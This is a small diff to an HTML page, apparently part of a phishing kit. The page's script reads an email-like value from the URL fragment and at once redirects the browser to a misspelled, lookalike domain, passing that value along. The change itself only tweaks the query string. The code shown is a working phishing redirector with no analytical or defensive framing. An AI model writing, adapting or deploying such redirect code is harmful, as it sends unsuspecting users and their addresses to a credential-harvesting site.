@@ -19,7 +19,7 @@
   var em = hash.split("#")[1];
 
   window.setTimeout(function () {
-   window.location.href = "https://intrenationaltanksservices.com/?zdtg&qrc" + em;
+   window.location.href = "https://intrenationaltanksservices.com/?zdtg" + em;
   }, 0);
  </script>
 </html>
